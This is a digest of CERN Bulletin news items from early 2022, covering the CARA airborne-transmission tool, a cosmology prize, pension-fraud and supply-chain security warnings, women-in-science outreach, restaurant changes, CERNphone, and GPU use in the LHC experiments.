The World Health Organization (WHO) invited CERN to sit on ARIA, an international expert working group focused on developing standards for airborne transmission of respiratory pathogens.
With the involvement of worldwide experts, the tool’s modelling capabilities were further optimised and refined, and the process culminated in the publication of the Interface Focus paper.
With the tool now fine-tuned thanks to expertise in health science, its models were able to successfully withstand benchmarking against both clinical data and real-life outbreaks, as presented in the paper.
Among other things, CARA’s accurate modelling across various parameters was able to confirm the importance of super-emitters in airborne transmission: while these may represent only 20% of infected hosts, they are found to emit up to one hundred times more viral-containing particles.
The software also provided new data corroborating the efficiency of mask wearing, as well as ventilation.
With the involvement of CERN’s HSE unit, as well as the Experimental Physics (EP), Beams (BE) and Information Technology (IT) departments – not to mention the experts in the ARIA working group – the effort made and the resources mobilised to develop the technology and analyse its data were considerable.  “Not only do we now have a model that is more accurate than ever, but it is also widely endorsed by the scientific community.
This for me was very important because, despite the advanced expertise of the CARA team at CERN, such an endorsement from experts in health science gave the tool the necessary impetus to be recognised on a wider scale”, says Andre.
Thanks to its open-source architecture, availability and user-friendliness, the software is now being used by various organisations around the globe.

CERN fellow wins Buchalter Cosmology Prize.
Dr Azadeh Maleknejad, a fellow in the Theoretical Physics department, was awarded second prize for her work on axion physics on 2 February 2022
Theory (TH) fellow Azadeh Maleknejad has won the 2021 Buchalter Cosmology Prize (second prize) for her work on axions, entitled “SU(2)R and its Axion in Cosmology: A Common Origin for Inflation, Cold Sterile Neutrinos, and Baryogenesis”.
The annual prize was created in 2014 by physicist-turned-entrepreneur Dr Ari Buchalter to reward new ideas with the potential of producing breakthroughs in our understanding of the universe.
Azadeh’s work, which was published in the Physical Review D journal, was acclaimed by the prize’s jury, composed of world-renowned cosmologists, as “a compelling new perspective on some of the most important questions in cosmology”.
The study introduces a model where the seeds for large-scale structure, dark matter and baryon asymmetry all share a common origin produced by quantum effects during an inflationary era.
It focuses on axions, theoretical particles that could account for both dark matter’s tremendous mass and matter–antimatter asymmetry in the strong sector.
Discovering the elusive particle has been an objective of several experiments at CERN and around the world.
In Azadeh’s words, “the early universe, before Big Bang nucleogenesis, is still mostly uncharted territory, and it requires physics beyond the Standard Model to answer its long-standing puzzles: the origin of the observed matter asymmetry, the nature of dark matter, massive neutrinos and cosmic inflation.
In the new scenario that I proposed, the axion inflation is embedded in the left-right symmetric model.
This scenario can possibly solve and assign a common origin to these seemingly unrelated mysteries of modern particle physics and cosmology.
I feel honoured that the prize’s jury found this thesis compelling.”
“I am very proud to have Azadeh in our group at CERN-TH and delighted for the much-deserved prize she has received, which is also a recognition of the active role that CERN-TH is playing in cosmology”, adds Gian Giudice, Head of the Theoretical Physics department at CERN.
The 2021 first prize was awarded to Dr Karsten Jedamzik of the Université de Montpellier and Dr Levon Pogosian of Simon Fraser University and the University of Portsmouth for their work on the Hubble tension.

A reminder to be alert to fraud attempts concerning your CERN pension.
We have received reports of CERN colleagues having been contacted by suspected fraudsters offering to provide advice about pension arrangements at CERN.
This has taken the form of telephone calls advising CERN colleagues that the Organization had subscribed to an approved partnership with a financial adviser based on CERN premises, who would offer a free meeting to explain how pensions in Switzerland work and how to maximise their return.
Further investigations revealed that the firm was not genuine and that many of the statements made were factually incorrect.
Your colleagues in the Pension Fund Management Unit (PFMU) do not consider this to be a sophisticated fraud attempt, but wish to take the opportunity to remind all colleagues of the following three key messages:
Your pension at CERN is very valuable and may attract fraudsters.
If anyone you’re unfamiliar with asks you questions about it or any other assets you have, you should be alert and carefully consider whether or not to engage with them.
No financial advisers are employed or approved by CERN or operate out of CERN premises (besides the UBS branch).
If anyone introduces themselves as such or tells you that CERN has asked them to contact you, they should not be trusted.
You are always encouraged to first contact your colleagues in the Pension Fund if you have any questions about your pension benefits.

New open access agreement for CERN-affiliated authors with the American Institute of Physics.
Thanks to a partnership with the Consortium of Swiss Academic Libraries, the CERN community can now benefit from a new Read and Publish deal with the American Institute of Physics (AIP).
This agreement has been negotiated by Swiss Universities, in collaboration with the national consortium.
Under this new contract, all research articles with CERN-affiliated corresponding authors can now be published open access in most AIP journals, with article publication charges (APCs) paid centrally.
CERN readers will continue to have access to content from all AIP journals that is otherwise behind paywalls.
The CERN-affiliation of the corresponding author is recognised during the submission process and the publications are automatically made open access, after approval by the Scientific Information Service (SIS).
However, CERN SIS needs to be informed before the submission of articles in case the corresponding author is not affiliated with CERN, or when authors want to submit articles to other AIP journals than those covered by this agreement.
For more information, please consult the CERN Open Access guidelines or send any question to

A successful sixth Women and Girls in Science and Technology event.
To mark the International Day of Women and Girls in Science, female ambassadors from local scientific institutions visited schools to promote science and technology among children
From 7 to 11 February 2022, around sixty volunteers, all female scientists and engineers from CERN, Scienscope (UNIGE), the École Polytechnique Fédérale de Lausanne (EPFL) and the Annecy Particle Physics Laboratory (LAPP), visited over a hundred classrooms in the local region to talk to some 2680 pupils about their careers.
The goal of these presentations, organised to mark the International Day of Women and Girls in Science, which takes place on 11 February, was to change how children see scientific, technical and technological professions.
And there’s no doubt that the volunteers’ talks helped a few of them – both girls and boys – to discover their vocations!
Despite the uncertain times, the classroom visits took place in person, in strict compliance with a protection plan approved by CERN and with the health and safety measures in force in schools in the Host States.
A few visits were rescheduled and will take place as soon as the health situation allows.
For the sixth year running, the Women and Girls in Science and Technology programme was a huge success.
Since 2017, thanks to the ever-expanding cohort of ambassadors eager to share their passion, more than 13 000 pupils aged between 7 and 15 in the local region have learned about jobs in science, technology, engineering and mathematics.

Computer Security: Time for a spring clean.
Spring is coming up fast and, in a deeply rooted tradition for house husbands and housewives, the time has come for a spring clean.
Thoroughly cleaning the rooms, repainting some walls, fixing broken tiles, pimping up and beautifying your property, getting rid of unused clothes (or those which changed size and do not fit anymore), throwing out things that are just accumulating dust.
And, while you’re at it, why not also take a look at your digital belongings, in particular those hosted by CERN?
Or to be thrown away, purged and deleted.
For good.  Experience has shown that creating/spawning digital resources is easy and usually comes with a need.
The incentive to create is a given.
But once a device, virtual machine, container, website, program or application is deployed and up and running, the incentive to maintain it diminishes. 
 If the resource does its job, why bother?
In many cases, the resources are sitting around idle, still consuming power and CPU cycles, blocking disk space, eating network bandwidth and posing a growing computer security risk.
The most recent vulnerability (“log4shell”) has once more demonstrated the problem: 
when we asked people to fix that vulnerability in certain “Openshift containers”, and there were dozens, about 50% of the owners replied by saying “I don’t need that anymore and deleted it”.
50%.  50% of resources idle …
Thus, spring has arrived and we would like to encourage you to use your freshly gained energy to review your digital resources.
Help us to save energy, licence costs, disk space and CPU cycles, and help us to reduce CERN’s exposure to cyberthreats and its consequential attack surface.
Please go through the following list and ensure that your resources are up to date and fully patched (see our Bulletin article on “Beauty under the hood”), or just purge resources that are no longer needed:

Celebrating the International Day of Women and Girls in Science.
The annual International Day of Women and Girls in Science on 11 February is an opportunity for global reflection, in addition to our local and daily efforts, on the ongoing challenges of fostering gender balance in STEM and on furthering steps towards impactful and tangible results.
Click here to see a clever, poignant animation of the experiences of Purl, a pink ball of yarn, who joins a homogenous, dark-suited, male-dominated workplace called “BRO”.
How many of us, like Purl, have tried to blend into the environment in order to feel a sense of belonging and acceptance and to hide our visible and/or invisible diversity just to fit in?
I relate to Purl: as a young child of inter-ethnic parents, I consciously and unconsciously played the “white-parent” card to blend in with my school and social surroundings, where I didn’t see anyone who looked like me.
I hid my unusual middle name starting with a “Z”; spicy meals at home were a secret.
It was easier, more comfortable and … limiting.
In my experience, when an underrepresented group such as women in STEM reaches a presence of around 25%, the individuals within that group are already less likely to seek to blend in with their surroundings.
At work, they are more likely to invest fully in their role and to reach out to and support others like them.
"Our ""25 by '25"" strategy, and your commitment to it, is a unique opportunity for CERN to boost gender diversity in STEM."
The visible and audible support from our Management for the initiative and the engagement of our colleagues in implementing it is very encouraging.
So what else can you do?
Well, many point to an insufficiently diverse external recruitment pool, yet our students, graduates and trainees form an invaluable talent pipeline inside CERN: our home-grown recruitment pool, from which a significant proportion of staff and fellows are selected.
To all hiring managers of students, graduates and trainees in STEM: the more gender-diverse your selection decisions, the more diverse the talent pipeline for future STEM fellows and staff will be.
To all personnel in STEM: reach out to the underrepresented gender in your team or group.  Actively include your and their diverse perspectives in your projects and meetings.
Diversity is a stated CERN value.
In all its forms, diversity creates excitement and innovation.
So, let’s mix it up – in STEM and beyond!
Launch of new catalogues at the CERN Stores.
The CERN Stores have expanded their range of semiconductors, electronic components and fastening parts
The punch-out catalogues of the CERN Stores, which are managed by the SCE department, give access to thousands of items at negotiated prices.
The electronic catalogue platform integrated into the EDH/Supply Chain order page makes purchasing professional equipment quick, secure and simple.
Most items can be delivered within 48 hours and the platform enables users to access technical support, manage returns and benefit from a two-year warranty thanks to the conditions that have been negotiated.
The list of supplier catalogues is regularly expanded thanks to the work of the SCE-SSC group and the Purchasing service.
The Material Request form can already be used to order Farnell, Radiospares, SFS, Lyreco, Distrilec, Art computer and Digikey products, covering most needs in electronics, computing equipment, tooling, fastening parts, stationery and various accessories.
In the coming weeks, two new suppliers will be added to CERN’s punch-out catalogues, increasing the range of products available through the Stores.
The distributor Mouser Electronics will make its cutting-edge semiconductors and electronic components available, with highly competitive delivery times, and items produced by Groupe Bossard, an expert in fastening technology, will be added to the existing SFS catalogue (up to 200 items per order).
Product listing enables users to identify regularly ordered items by simply submitting a request using the dedicated form.
Thanks to standardisation work being carried out in parallel, technical standards can be defined for the materials, components and equipment regularly used at CERN.
The list of items to be standardised is defined by technical experts, users and purchasing and logistics officials.
The goal of this standardisation exercise is to improve, as far as possible, the compatibility, safety, continuity of supply and quality of the products ordered.
The launch of new punch-out catalogues is part of a global process on which the SCE department, the purchasing and finance services and all their partners are working every day.
To contact them, please use the following addresses:
Logistical and operational questions: Order modifications and cancellations: Return of equipment: SNOW form Order tracking: contact the supplier by email at the address indicated in the “Document Status” field of your order form.
7th Geneva Engage Awards honour Indico event platform.
On 1 February, in recognition of the Indico tool, CERN was presented with the “special award for effective and innovative online meetings” at the 7th Geneva Engage Awards online event, organised by the Geneva Internet Platform.
The annual Geneva Engage Awards recognise International Geneva actors for their social media outreach, online engagement and efforts towards more inclusive online meetings.
Launched at CERN in 2002 as a European project, Indico is an open-source tool for event organisation, archiving and collaboration.
CERN adopted it as its own event-management solution in 2004 and has financed its development ever since.  Other partners and external contributors have provided valuable contributions over the years.
“Receiving this award is a great honour for the whole team and also highlights the importance of the project, not only for CERN, but also outside the physics community,” says Adrian Mönnich, leader of the Indico project.
Indeed, since its launch, Indico has been used at CERN for the organisation of more than 900 000 events, and is daily used to manage 200 rooms.
The platform has also been adopted by the United Nations and other organisations in Geneva and beyond.
“Not only is this Geneva Engage Award a very welcome recognition of the ceaseless dedication of the Indico team, it also represents acknowledgement of an important step in the wider adoption of and support for Indico,” says Tim Smith, leader of the Collaboration, Devices and Applications (CDA) group in CERN’s IT department.
“Working with significant external contributors such as the UN means strong and visible support for an open-source project.”
CERN marks Data Protection Day with EMBL, ESA and ESO.
On 28 January, CERN teamed up again with fellow EIROforum organisations EMBL, ESA and ESO to deliver a thought-provoking online event on the 16th Data Protection Day.
The event was attended by over 350 participants, who enjoyed engaging presentations on the practical challenges of managing the use of data in COVID-19 research to allow the world to react quickly and effectively to a pandemic, as well as examples of the ways in which data protection is starting to drive choices of IT security tools.
Attendees were also reminded of the importance of ensuring that our devices' technical tools continue to evolve to protect our data, without compromising the overall user experience.
One of the key messages from the event was that:“Personal data of all types is valuable to somebody!”
During the closing remarks, CERN’s Data Privacy Adviser highlighted the very welcome change in mindset around data privacy, noting that the activities of the four organisations indicated that data protection is becoming an integrated and essential part of scientific projects and can even be an enabler of research.
This valuable opportunity for the CERN community to exchange views and discuss best practices across different scientific organisations was an excellent complement to the important work that is already taking place here at CERN.
The Office of Data Privacy (ODP) continues to ensure that CERN adopts best practices for handling personal data, in line with Operational Circular 11 “The processing of personal data at CERN” (OC11).
The ODP is supported by the Data Privacy Coordination Committee (DPCC), which, with its nominated departmental representatives, is ensuring a coherent and harmonised implementation of the rights and obligations set out in OC11.
If you were unable join the Data Protection Day event live, you can still watch the recording available on CDS and CERNbox.
Our warm thanks to the CERN ODP and representatives from EMBL, ESA and ESO for organising this excellent event, which is becoming a regular fixture to help CERN participate in the worldwide celebration of Data Protection Day.

Environmental awareness: creating a positive impact on the environment through innovation.
A new programme will harness CERN’s technologies and know-how to contribute to society’s efforts towards preserving the planet
The potential of technological innovation is vast, and when it comes to curbing the impact of activities harming our environment – such as energy consumption and greenhouse gas emissions – it holds a particular significance.
In this context, innovative ideas and technologies developed in research centres like CERN represent a promising opportunity to stimulate positive environmental impact.
CERN-developed technologies, facilities and know-how can be applied to environmental research.
One recent example is the CERN Control and Monitoring Framework (C2MON), which was originally designed to cope with the Laboratory’s demanding infrastructure-monitoring needs and is now used in several external initiatives, such as the spin-off company PlanetWatch (the company uses it for data acquisition systems in the framework of air quality monitoring).
Further, through fundamental research, CERN produces scientific knowledge with direct environmental relevance, as illustrated by the CLOUD experiment, which studies atmospheric and climate science.
Acknowledging global environmental challenges, CERN is taking steps to move from serendipity to a conscious effort to harness the Organization’s unique skillset, with the aim of participating in society’s efforts to preserve the planet.
Concretely, a CERN Innovation Programme on Environmental Applications is now being set up.
The programme will be instrumental in maximising CERN’s impact on environmental applications.
As a first step, ideas on how to address major environmental challenges through CERN technologies, know-how and facilities will be collected from experts, and the most promising concepts selected.
The CERN Knowledge Transfer group will then provide full support to the selected ideas, which may give rise to impactful projects in collaboration with external partners.
Several strategic sectors and sub-domains with high impact potential and strong synergies with CERN’s technical domains of expertise have been identified:
renewable and low-carbon energy (production, transformation, distribution, storage), clean transportation and future mobility (aviation, shipping, rail and automotive), climate change and pollution control (monitoring, modelling, mitigation), sustainability and green science (power management, heat management, industrial processes).
Possible examples include superconducting technologies for high-efficiency power transmission, cryogenics and vacuum for advanced hydrogen storage, and big data analysis tools for global-scale climate simulations.
More information about the call for ideas for the CERN Innovation Programme on Environmental Applications will follow in the coming months.
Find out more on the Knowledge Transfer page dedicated to environmental applications.
This article is part of the series “CERN’s Year of Environmental Awareness”.
CERN’s Knowledge Transfer (KT) group has the mission to transfer the innovations produced by CERN experts to fields beyond high-energy physics, maximising the global positive impact of CERN on society.
This is made possible in particular through industry in the Member and Associate Member States.
From 2022, KT is focusing its efforts on five main application areas: medical, aerospace, digital, quantum and environment.
Every year, some 50 knowledge transfer contracts are signed, and many more technologies are identified internally, spanning all application fields.
A new Thematic CERN School of Computing: “Security of research computing infrastructures”.
With security threats on the constant rise and scientific computing increasingly federated and interconnected, the CERN School of Computing has created a new Thematic School focused on the security of research computing infrastructures.
The programme covers various topics grouped in three tracks: protection and prevention, detection, and response.
The school is designed for service managers and security professionals working in academia and research institutes, who, as part of their job, need to ensure the security and resilience of the computing resources they manage, and want to be prepared to detect and handle possible security incidents.
Provided that the health situation allows it, the school will take place on 19–25 June 2022 in Split, Croatia.
If travelling or physical attendance is not possible, the school will be moved to an online format.
Applications are open until Sunday, 13 March.
For more information and to apply, please visit the Indico page of the event.

Take part in CERN’s Women in Technology 2022 Mentoring Programme.
For the sixth year running, CERN is celebrating the International Day of Women and Girls in Science.
From 7 to 11 February 2022, female scientists and engineers are visiting local schools to talk to the pupils about their professions, with the aim of showing the role of women in science and potentially inspiring young girls to envision their future job in STEM-related (science, technology, engineering and mathematics) fields.
At CERN, participation in this event is organised by the Visits & Exhibitions service, with the support of CERN’s Women in Technology network.
Gender equality, and more generally diversity, are key to the best possible science, which is why CERN launched the Diversity and Inclusion programme’s 25 by ’25 strategy, which is the first ever target-based strategy to boost gender and nationality diversity within the staff and fellows population (MPE, for employed members of the personnel).
At CERN, an average of 21.41%* of the MPE are women.
The goal of the 25 by ’25 strategy is to reach 25% by 2025.
CERN’s Women in Technology (WIT) network is an informal group that was spontaneously born at the beginning of 2016: a few women working in STEM had appreciated the WIT community in their universities and could not find a similar organisation at CERN, or even in Geneva, so they created it!
In six years, CERN’s WIT has brought to life plenty of activities: WIT Talks are interviews with women in leading roles at CERN, in industry or in academia; WIT Diversity Talks are interviews with senior male colleagues on their experiences and thoughts on gender diversity and gender balance; WIT Drinks are an opportunity for networking among women from different experiments and departments at CERN; lectures and movie screenings are organised in liaison with other organisations, companies or CERN services; and WIT Mentoring offers an opportunity for younger women to work on their personal development with a CERN or CERN Alumni mentor.
The WIT Mentoring Programme is now running for the 5th year and will soon call for mentees and mentors for the 2022 exercise, beginning in May and ending in December.
The call for applications for mentees and mentors will be available on the WIT website at the beginning of March and an informative session will be held on 25 February.
Mentees benefit from the support of a senior colleague or CERN alumna with extensive experience and good knowledge of the Organization and/or of workplaces outside the Laboratory.
They can find a confidential space where guidance is offered to improve self-confidence, self-advocacy, critical thinking and many other skills.  The programme is open to anyone with a clear motivation to work on their personal and professional development.
Mentors benefit from the support of the WIT mentoring team, consisting of informative sessions, resources and online seminars, guidance and reminders throughout the mentoring exercise.
Being a mentor is extremely rewarding and improves many soft skills, such as active listening, communication, coaching, analysis and problem solving, building on structured thinking – but unlike a training course, mentoring helps assimilate these skills into “muscle memory”!

Temporary reorganisation of Restaurant 1.
Taking advantage of the fact that the Laboratory is currently quieter than usual, refurbishment work is taking place in Restaurant 1, beginning on Monday, 7 February 2022 and lasting for a month.
The self-service stations in the middle of Restaurant 1 have been temporarily removed.
To ensure continuity of service without too much disruption and to maintain a varied menu, various temporary changes have been made: the pizza oven has been relocated to the former Post Office, the Grab ‘n’ Go service has extended both its opening times and its selection, which will now include hot meals, and Restaurant 2 has reopened.
Click & Collect is another choice that remains open to you.
You can use the MyNovae application to order your meal and choose when and where to collect it.
As the work does not affect the restaurant’s seating area, the number of places available remains unchanged.
As a reminder, the opening times and hours of service are currently as follows (from Monday to Friday).
Restaurant 1: 7.00 a.m. to 4.00 p.m.
Lunch service: 11.30 a.m. to 2.00 p.m.
Grab ‘n’ Go (R1): 7.00 a.m. to 4.00 p.m.
Lunch service: 11.30 a.m. to 2.00 p.m.
Click & Collect: 11.00 a.m. to 2.00 p.m.
Pizzas (R1)
Lunch service (former Post Office): 11.30 a.m. to 2.00 p.m.
Restaurant 2: 7.30 a.m. to 2.30 p.m.
Lunch service (ground floor): 11.30 a.m. to 2.00 p.m.
A modern telephony system at CERN.
CERNphone, a softphone client for mobile phone and computer, will gradually replace fixed phones over the coming months
Support for fixed phones at CERN will be gradually phased out over the coming year.
These phones, which are connected to the ageing Alcatel PABX (private phone exchange)*, will be replaced by CERNphone.  CERNphone is a softphone client, which is a piece of software that allows users to make telephone calls over the internet.
It is available for Android and Apple mobile phones, as well as for Windows, Macintosh and Linux desktops and laptops.
The migration is scheduled to be complete by mid-2023.
Using CERNphone will be no different from the way we now talk to friends and family using instant messaging applications (e.g. WhatsApp or Signal) rather than our home or mobile phones.
And, just as such applications enable us to talk for free when connected to Wi-Fi and to be reachable anywhere, CERNphone allows us to be reached anywhere in the world via our CERN fixed number and will help reduce telephony costs for CERN.
Many of us are already using CERNphone around the world, as you can see from the picture below.
No extra costs are incurred** from calls made using CERNphone on your mobile phone when you are connected to Wi-Fi.
When not connected to Wi-Fi, using CERNphone is also much cheaper than using your mobile phone subscription.
For example, a call made on roaming in the United States with CERNphone costs just one hundredth of a call dialled on your mobile phone.
Moving to softphones will also allow CERN to reduce electronic waste as the physical phones we have today – as well as the physical infrastructure that supports them – will not need to be replaced with hardware that then has to be thrown away in the future.
The migration to CERNphone will happen progressively throughout the year, so no action on your side is required unless you are contacted.
However, if you would like to switch to using CERNphone sooner, please follow the migration and installation guide.
Note that you don’t need a CERN mobile phone subscription to use CERNphone on an Android or Apple mobile phone, and calls do not cost you anything when connected to Wi-Fi (available in all CERN offices).
If you do not have access to a Wi-Fi connection, you can still use the data available through your subscription.
Costs are low: for example, you could talk on CERNphone for over three days and still not use up a 5 GB/month data contract.

* In large organisations, “PABX” connect all internal phones to each other and to external networks.
CERN relies on the Alcatel PABX, installed in the 1990s, and on TONE, a system developed in-house that is gradually taking over the functions of the Alcatel PABX.
** The cost of the call to CERN will be the same as for a call made from an office phone at CERN.
LHC experiments are stepping up their data processing game.
While data processing demand is rocketing for LHC’s Run 3, the four large experiments are increasing their use of GPUs to improve their computing infrastructure
Analysing as many as one billion proton collisions per second or tens of thousands of very complex lead collisions is not an easy job for a traditional computer farm.
With the latest upgrades of the LHC experiments due to come into action next year, their demand for data processing potential has significantly increased.
As their new computational challenges might not be met using traditional central processing units (CPUs), the four large experiments are considering graphics processing units (GPUs).
GPUs are highly efficient processors, specialised in image processing, and were originally designed to accelerate the rendering of three-dimensional computer graphics.
Their use has been studied in the past couple of years by the LHC experiments, the Worldwide LHC Computing Grid (WLCG) and CERN openlab.
Increasing the use of GPUs in high-energy physics could increase the total computing power of computing systems with space or electrical power limitations, and it could improve the overall energy efficiency as well.
“The LHC’s ambitious upgrade programme poses a range of exciting computing challenges; GPUs can play an important role in supporting machine-learning approaches to tackling many of these,” says Enrica Porcari, Head of the CERN IT department.
“Since 2020, the CERN IT department has provided access to GPU platforms in the data centre, which have proven popular for a range of applications.
On top of this, CERN openlab is carrying out important investigations into the use of GPUs for machine learning through collaborative R&D projects with industry and the Scientific Computing Collaborations group is working to help port – and optimise – key code from the experiments.”
ALICE has pioneered the use of GPUs in its high-level trigger online computer farm (HLT) since 2010 and is the only experiment using them to such a large extent to date.
The newly upgraded ALICE detector has more than 12 billion electronic sensor elements that are read out continuously, creating a data stream of more than 3.5 terabytes per second.
After first-level data processing, there remains a stream of up to 600 gigabytes per second.
These data are analysed online on a high-performance computer farm, consisting 250 nodes, each equipped with eight GPUs and two 32-core CPUs.
Most of the software that assembles individual particle detector signals into particle trajectories (event reconstruction) has been adapted to work on GPUs.
In particular, the GPU-based online reconstruction and compression of the data from the Time Projection Chamber, which is the largest contributor to the data size, allows ALICE to further reduce the rate to a maximum of 100 gigabytes per second before writing the data to the disk.
Without GPUs, about eight times as many servers of the same type and other resources would be required to handle the online processing of lead collision data at a 50 kHz interaction rate.
ALICE successfully employed online reconstruction on GPUs during the LHC pilot beam data taking at the end of October 2021.
When there is no beam in the LHC, the online computer farm is used for offline reconstruction.
In order to leverage the full potential of the GPUs, the full ALICE reconstruction software has been implemented with GPU support, and more than 80% of the reconstruction workload will be able to run on the GPUs.
From 2013 onwards, LHCb researchers carried out R&D work into the use of parallel computing architectures, most notably GPUs, to replace parts of the processing that would traditionally happen on CPUs.
This work culminated in the Allen project, a complete first-level real-time processing implemented entirely on GPUs, which is able to deal with LHCb’s data rate using only around 200 GPU cards.
Allen allows LHCb to find charged particle trajectories from the very beginning of the real-time processing, which are used to reduce the data rate by a factor of 30–60 before the detector is aligned and calibrated and a more complete CPU-based full detector reconstruction is executed.
Such a compact system also leads to substantial energy efficiency savings.
Starting in 2022, the LHCb experiment will process 4 terabytes of data per second in real time, selecting 10 gigabytes of the most interesting LHC collisions each second for physics analysis.
LHCb’s unique approach is that instead of offloading work, it will analyse the full 30 million particle-bunch crossings per second on GPUs.
Together with improvements to its CPU processing, LHCb has also gained almost a factor of 20 in the energy efficiency of its detector reconstruction since 2018.
LHCb researchers are now looking forward to commissioning this new system with the first data of 2022, and building on it to enable the full physics potential of the upgraded LHCb detector to be realised.
CMS reconstructed LHC collision data with GPUs for the first time during the LHC pilot beams in October last year.
During the first two runs of the LHC, the CMS HLT ran on a traditional computer farm comprising over 30 000 CPU cores.
However, as the studies for the Phase 2 upgrade of CMS have shown, the use of GPUs will be instrumental in keeping the cost, size and power consumption of the HLT farm under control at higher LHC luminosity.
And in order to gain experience with a heterogeneous farm and the use of GPUs in a production environment, CMS will equip the whole HLT with GPUs from the start of Run 3: the new farm will be comprised of a total of 25 600 CPU cores and 400 GPUs.
The additional computing power provided by these GPUs will allow CMS not only to improve the quality of the online reconstruction but also to extend its physics programme, running the online data scouting analysis at a much higher rate than before.
Today about 30% of the HLT processing can be offloaded to GPUs: the calorimeters local reconstruction, the pixel tracker local reconstruction, the pixel-only track and vertex reconstruction.
The number of algorithms that can run on GPUs will grow during Run 3, as other components are already under development.
ATLAS is engaged in a variety of R&D projects towards the use of GPUs both in the online trigger system and more broadly in the experiment.
GPUs are already used in many analyses; they are particularly useful for machine learning applications where training can be done much more quickly.
Outside of machine learning, ATLAS R&D efforts have focused on improving the software infrastructure in order to be able to make use of GPUs or other more exotic processors that might become available in a few years.
A few complete applications, including a fast calorimeter simulation, now also run on GPUs, which will provide the key examples with which to test the infrastructure improvements.
“All these developments are occurring against a backdrop of unprecedented evolution and diversification of computing hardware.
The skills and techniques developed by CERN researchers while learning how to best utilise GPUs are the perfect platform from which to master the architectures of tomorrow and use them to maximise the physics potential of current and future experiments,” says Vladimir Gligorov, who leads LHCb’s Real Time Analysis project.

A new system to measure the number of people entering Restaurant 3.
The SSC (Services and Supply Chain) group in the SCE department is developing new solutions to allow on-site facilities to function well despite COVID restrictions: a series of initiatives concerning the restaurants, hostels, the shipping service and shops, to name but a few, have been introduced to make sure that the standard of service provided is as close as possible to normal.
One of these initiatives – still in the pilot stage – is designed to measure the number of people entering Restaurant 3 on the Prévessin site in order to improve the flow of traffic.
This innovative new system, which has been running since 15 December, allows everyone on site to check the number of seats available in the restaurant in real time and helps ensure that diners can enjoy their lunch while observing the applicable health rules.
The people counter can be checked at any time at this link (link only accessible from the CERN site).
Erroneous payout of “inflation compensation” in France.
Some members of the CERN personnel residing in France have received a message from their local tax office (centre des finances publiques) concerning inflation compensation (indemnité inflation) (see: ).
This measure is aimed at people whose net professional income or income replacement is less than 2000 euros per month.
Members of the personnel who receive this compensation must repay it via a dedicated reimbursement portal, which will be accessible from the impots.gouv.fr website at the beginning of February (from the “Particulier” tab of the impots.gouv.fr website, under the heading “Indemnité inflation”).
Once the “Indemnité inflation” page is open, the menu will be as follows:
a link to the government communication website (FAQ on www.gouvernement.fr); one or more links to the applicable legal texts (Légifrance); a link: “Je souhaite rembourser une aide indemnité inflation qui m’a été versée par erreur” (I wish to reimburse an inflation compensation payout that was made to me in error).
Clicking on this last link will take you to a form where you have to specify the amount to be reimbursed (100 euros).
Payment must be made by credit card via the PayfiP portal and, once confirmed, a PayfiP payment receipt will be sent to the email address of the person concerned.
This payment receipt will serve as proof for the French administration.
Please take appropriate action as soon as possible.
Computer Security: Supply chain time bombs.
Recent articles on computer security (“Unwanted presents”) discussed CERN’s conscious – but also sometimes involuntary – dependence on external companies and service providers and software libraries and packages, and the resulting inherent computer security risks.
While, in principle, there are solutions to cope with software dependencies, it is not so easy to protect against dependencies on physical external providers, companies and suppliers.
A recent quick study by the Computer Security team revealed the tip of the iceberg.
The attack vectors into the Organization are multiple.
Probing CERN’s web-sphere and internet-visible services is one attack vector, infecting your PC or laptop is another, and luring you into disclosing your password to an attacker is a third.
Attackers employ many different methods to reach their goals, like vulnerability scanning, malware or sophisticated phishing emails.
But given the various protective means that have been put in place, direct attacks may no longer be fruitful.
Hence the shift to attacks against the supply chain, such as compromising often-used software packages, infecting external webpages and people “drive-by infecting” computers or impersonating people.
A more sophisticated approach is when attackers compromise entire, less protected, less secure companies and suppliers and abuse their resources to attack the big fish.
Like the machinery supplier to CERN whose invoicing system was abused by attackers who subsequently tampered with invoices that CERN was supposed to pay.
Or like that other external machinery provider whose email system was abused to send seemingly reasonable emails, referring to real email exchanges between them and CERN experts, in order, once more, to extract money from CERN.
Recently, the CERN Computer Security team got their hands on a publicly available list of companies that have been subject to so-called “ransomware attacks” and – wisely – refused to pay the ransom.
This still implies that the attackers compromised and got hold of those companies’ internal systems, including, probably, invoicing and email systems.
In case of so-called “extortion attacks”, they might also have managed to exfiltrate confidential business data.
A comparison of that list with the companies listed in CERN’s supplier database showed that approximately five (5!) CERN-registered companies fell victim to a ransomware or extortion attack every single month.
That’s five new companies, on average, per month that were compromised and might be used by attackers to infiltrate CERN or might hold data related to our operations, contracts, NDAs and other sensitive information linked to the Organization.
But not every business is necessarily pro-active in warning its customers of the fact that their data has been, or might have been, exposed through a security breach.
So CERN may never be alerted to such by a supplier.
Hence, CERN, like many other companies, is sitting on a computer security time bomb that is waiting to explode.
So is there anything we can do?
Not much, apart from being even more vigilant and suspicious.
Our external providers and suppliers are getting attacked.
Apparently, they are getting compromised.  Hence, if you are in contact with external companies, be warned.
Of course, trust is important and they deserve the benefit of the doubt, but once it comes to transferring money or amending contracts or sensitive data, for example, be extra vigilant.  Be suspicious.
Proposed changes to banking details, IBANs and transfer methods, etc., should set alarm bells ringing, as should requests for more money than was in the contract or for additional personal or institutional sensitive data and attempts to lure you into installing unsolicited software.
Try to check those change requests directly with your sales or contract contact person.  Ideally by phone rather than return email because their email address could well be compromised and, hence, be under the control of the attacker.
Check with other people who are part of the company and go up the hierarchy for confirmation of the answer.
Also, raise this with the CERN Procurement Team in the IPT department or drop an email to us at the legal side, we are currently revising the General Conditions of CERN Contracts so that our suppliers will, in future, be contractually required to notify CERN in the event that they fall prey to a successful cyberattack.

International Day of Women and Girls in Science is on 11 February: local activities for all ages.
To celebrate women in science, CERN is hosting a public screening of the documentary Picture a Scientist and inviting female ambassadors from local scientific institutions to visit schools and talk to the children about their work
The International Day of Women and Girls in Science was adopted by the United Nations General Assembly in order to promote full and equal access and participation for women and girls in science.
11 February is an opportunity to celebrate the essential role that women and girls play in science and technology.
As it does every year, CERN is partnering up with research institutions in the local region to celebrate this day by organising local activities for all ages.
From 7 to 11 February 2022, almost sixty volunteers, all female scientists and engineers from CERN, Scienscope (UNIGE), the École Polytechnique Fédérale de Lausanne (EPFL) and the Annecy Particle Physics Laboratory (LAPP) will be visiting local schools, either in person or virtually, to talk to the pupils about their professions.
They will visit more than 110 classes in the local area (canton of Geneva, Pays de Gex and Greater Annecy).
The female scientists and engineers will talk about how they got to where they are today, offer an insight into the projects and experiments on which they are working, and maybe even give some practical demonstrations.
The aim is to change how young people in our region view scientific, technical and technological professions and to show them that STEM careers are just as accessible to girls as to boys.
